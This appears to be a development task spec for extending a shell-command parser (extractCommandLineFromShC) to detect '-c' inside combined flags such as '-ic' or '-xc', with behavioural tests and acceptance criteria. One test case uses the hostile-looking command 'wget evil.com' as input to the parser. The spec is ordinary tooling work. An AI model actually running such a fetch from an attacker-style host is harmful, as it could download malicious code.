## TLDR

Match `-c` within combined single-dash flags (e.g. `-ic`, `-xc`) in `extractCommandLineFromShC`.

## What to build

Modify `extractCommandLineFromShC` to find the `-c` flag even when combined with other short flags in a single token. The matching rule: a suffix token starts with `-` (single dash, not `--`) and contains the character `c`. When matched, the inner command string is the next suffix token (unchanged behavior).

The existing exact `-c` match becomes a special case of the new rule, so the old logic is replaced, not supplemented.

## Behavioral Tests

**Combined flags extract inner command:**
- `zsh -ic 'git-file-lint'` extracts `['git-file-lint']`
- `bash -ci 'echo hello'` extracts `['echo hello']`
- `sh -xc 'wget evil.com'` extracts `['wget evil.com']`
- `sh -ixc 'echo ok && touch test'` extracts `['echo ok', 'touch test']`
- `sh -icx 'echo ok'` extracts `['echo ok']` (c not last — command is next suffix token after the flag containing c)

**Long-form flags do not match:**
- `sh --interactive 'echo hello'` returns the opaque command (no `-c` found)

## Acceptance criteria

- [ ] `extractCommandLineFromShC` matches `-c` within any single-dash combined flag
- [ ] Long-form flags (`--*`) containing `c` do not match
- [ ] All new behavioral tests pass
- [ ] All existing tests still pass
